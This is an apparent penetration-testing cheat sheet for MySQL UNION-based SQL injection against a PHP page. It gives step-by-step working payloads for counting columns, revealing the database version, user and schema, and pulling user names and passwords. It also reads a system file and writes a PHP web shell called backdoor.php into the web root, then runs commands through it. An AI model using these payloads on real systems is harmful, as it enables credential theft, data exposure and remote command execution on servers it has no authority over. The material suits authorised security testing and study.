# MySQL Injection 

- These examples are GET requests, but can be exploited the same with POST

## Number of Cols with Order By
Use to determine number of columns

```
comment.php?id=738 order by 1
```

Increment column number until you get an error to determine number of cols.

# Expose Data with Union All Select


```
union all select
```

Use numbers to show where data is displayed on the page
```
comment.php?id=738 union all select 1,2,3,4,5,6
```

Show DB version
```
comment.php?id=738 union all select 1,2,3,4,@@version,6
```

Show current user of DB connection
```
comment.php?id=738 union all select 1,2,3,4,user(),6
```

Show DB schema
```
comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
```

Display column names of users table
```
comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
```

Get names and passwords from users table
```
comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users 
```

## Write a file 

Try to load a file
```
comment.php?id=738 union select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6 FROM users 
```

Write a file
```
comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php' 
```

Access shell
```
backdoor.php?cmd=ipconfig
```
